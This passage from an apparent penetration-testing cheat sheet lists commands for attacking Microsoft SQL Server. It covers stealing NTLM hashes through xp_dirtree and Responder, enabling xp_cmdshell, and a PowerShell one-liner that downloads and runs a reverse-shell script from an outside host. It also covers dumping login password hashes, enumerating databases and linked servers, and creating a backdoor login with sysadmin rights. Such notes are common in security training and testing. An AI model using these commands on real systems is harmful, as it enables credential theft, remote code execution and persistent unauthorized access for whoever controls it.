```
cp /usr/share/doc/python3-impacket/examples/mssqlclient.py 
sudo python3 mssqlclient.py USER:PASS@IP

SQL> select @@ version;
```
### Steal NTLM hash
```
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat
```
### Try to enable code execution
```
  SQL> enable_xp_cmdshell
```
### Execute code, 2 sintax, for complex and non complex cmds
```
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
SELECT name FROM master.dbo.sysdatabases #Get databases
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES; #Get table names
```
  
### List Linked Servers
```
EXEC sp_linkedservers
SELECT * FROM sys.servers;
```
### List users
```
  select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```
### Create user with sysadmin privs
```
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'
```
